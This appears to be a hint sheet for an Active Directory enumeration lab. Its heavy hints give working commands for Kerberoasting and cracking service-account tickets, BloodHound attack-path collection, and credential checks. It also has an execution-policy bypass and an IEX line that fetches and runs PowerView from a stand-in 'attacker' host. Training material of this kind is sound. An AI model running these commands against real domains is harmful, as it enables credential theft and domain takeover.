# AD Enumeration Hints

Progressive hints for each enumeration task.

---

## Task 1: Identify Domain Controllers

### Hint 1 (Light)
Domain Controllers advertise themselves through specific DNS SRV records. Try querying DNS for records containing "_ldap._tcp.dc".

### Hint 2 (Medium)
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
# or
nmap -p 88,389,636 192.168.1.0/24
```

### Hint 3 (Heavy)
```bash
# Full solution
# 1. DNS lookup for DCs
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# 2. Or scan network for Kerberos port
nmap -p 88 --open 192.168.1.0/24

# 3. Use crackmapexec
crackmapexec smb 192.168.1.0/24 --dc
```

---

## Task 2: Enumerate All Domain Users

### Hint 1 (Light)
You can query LDAP directly for user objects. The filter is `(objectCategory=person)(objectClass=user)`.

### Hint 2 (Medium)
```bash
# Using Impacket
GetADUsers.py -all domain.local/user:password -dc-ip DC_IP
```

### Hint 3 (Heavy)
```bash
# Full ldapsearch command
ldapsearch -x -H ldap://dc01.domain.local \
  -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" \
  sAMAccountName userPrincipalName description memberOf

# Or PowerView
Get-DomainUser -Properties samaccountname,description,memberof
```

---

## Task 3: Identify High-Value Groups

### Hint 1 (Light)
Look for built-in groups like "Domain Admins", "Enterprise Admins", and "Administrators". Also check for groups with "Admin" in the name.

### Hint 2 (Medium)
```powershell
# Key groups to enumerate
Get-DomainGroup -Identity "Domain Admins" -Recurse
Get-DomainGroup -AdminCount
```

### Hint 3 (Heavy)
```powershell
# Enumerate all privileged groups and members
$privilegedGroups = @(
    "Domain Admins",
    "Enterprise Admins",
    "Administrators",
    "Backup Operators",
    "Account Operators",
    "DnsAdmins"
)

foreach ($group in $privilegedGroups) {
    Write-Host "=== $group ===" -ForegroundColor Yellow
    Get-DomainGroupMember -Identity $group -Recurse |
      Select MemberName, MemberObjectClass
}
```

---

## Task 4: Discover Service Accounts (SPNs)

### Hint 1 (Light)
Service Principal Names (SPNs) are registered for service accounts. Users with SPNs are Kerberoastable.

### Hint 2 (Medium)
```bash
# Use GetUserSPNs.py from Impacket
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP
```

### Hint 3 (Heavy)
```bash
# Get SPNs and request tickets for cracking
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -outputfile tgs_hashes.txt

# Then crack with hashcat
hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt
```

```powershell
# PowerView alternative
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
```

---

## Task 5: Collect BloodHound Data

### Hint 1 (Light)
BloodHound collectors can be run from Windows (SharpHound) or Linux (bloodhound-python).

### Hint 2 (Medium)
```bash
# From Linux
bloodhound-python -d domain.local -u user -p password -dc dc01.domain.local -c All
```

### Hint 3 (Heavy)
```bash
# Full BloodHound setup and collection

# 1. Start neo4j and BloodHound
sudo neo4j start
bloodhound --no-sandbox

# 2. Collect data from Linux
bloodhound-python -d domain.local -u user -p password -dc dc01.domain.local -c All

# 3. Import JSON files into BloodHound GUI
# Drag and drop the generated JSON files

# From Windows:
.\SharpHound.exe -c All -o C:\Temp --zipfilename bloodhound_data.zip
```

---

## Task 6: Analyze Attack Paths

### Hint 1 (Light)
Use BloodHound's pre-built queries. Look for "Shortest Paths to Domain Admins" in the Analysis tab.

### Hint 2 (Medium)
```
In BloodHound:
1. Click the hamburger menu
2. Select "Pre-Built Analytics Queries"
3. Run "Find Shortest Paths to Domain Admins"
4. Mark your current user as "owned"
5. Run "Shortest Paths to Domain Admins from Owned Principals"
```

### Hint 3 (Heavy)
```cypher
# Custom Cypher queries in BloodHound

# Find path from specific user to DA
MATCH p=shortestPath(
    (u:User {name:"YOUR_USER@DOMAIN.LOCAL"})
    -[*1..]->
    (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

# Find all Kerberoastable paths to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

# Find high-value targets
MATCH (n {highvalue:true}) RETURN n
```

---

## General Troubleshooting

### Authentication Errors
```bash
# Check if credentials work
crackmapexec smb dc01.domain.local -u user -p password

# Try with domain prefix
crackmapexec smb dc01.domain.local -u user -p password -d DOMAIN
```

### LDAP Connection Issues
```bash
# Test basic LDAP connectivity
ldapsearch -x -H ldap://dc01.domain.local -s base

# Try with SSL
ldapsearch -x -H ldaps://dc01.domain.local -s base
```

### PowerView Not Working
```powershell
# Bypass execution policy
powershell -ep bypass

# Load from memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Use inline module
IEX (Get-Content .\PowerView.ps1 -Raw)
```

### BloodHound Connection Issues
```bash
# Reset neo4j password
neo4j-admin set-initial-password newpassword

# Check neo4j is running
sudo systemctl status neo4j

# Clear database (start fresh)
rm -rf ~/.neo4j/
```

---

## Common Mistakes

1. **Forgetting to specify domain** - Always include the domain in your commands
2. **Using IP instead of hostname** - Some tools require the FQDN
3. **Wrong credentials format** - Try `user@domain` and `domain\user`
4. **Firewall blocking ports** - Check if 389, 445, 88 are accessible
5. **Time synchronization** - Kerberos requires time sync within 5 minutes
6. **Case sensitivity** - LDAP filters are case-sensitive for some attributes
